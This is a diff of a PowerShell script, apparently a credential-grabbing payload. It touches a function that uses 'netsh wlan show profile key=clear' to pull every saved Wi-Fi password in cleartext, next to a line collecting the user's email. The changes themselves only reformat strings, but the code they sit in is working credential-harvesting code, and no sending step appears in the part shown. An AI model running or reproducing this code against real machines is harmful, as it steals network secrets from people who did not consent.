@@ -66,7 +66,6 @@ $EM = Get-email
 ############################################################################################################################################################
 
 # Get nearby wifi networks
-
 function Get-WifiPasswords {
     try {
         # Get Wi-Fi profiles using netsh
@@ -81,16 +80,16 @@ function Get-WifiPasswords {
                 try {
                     $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
                 } catch {
-                    Write-Error "Failed to retrieve Wi-Fi password for ${profile}"
+                    Write-Error ("Failed to retrieve Wi-Fi password for {0}" -f $profile)
                     break
                 }
             }
 
             # Return the profile name and password if found
             if ($keyContent) {
-                "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')"
+                "{0}: {1}" -f $profile, ($keyContent -replace 'Key Content\s*:\s*', '')
             } else {
-                "${profile}: No password found or access denied"
+                "{0}: No password found or access denied" -f $profile
             }
         }
 
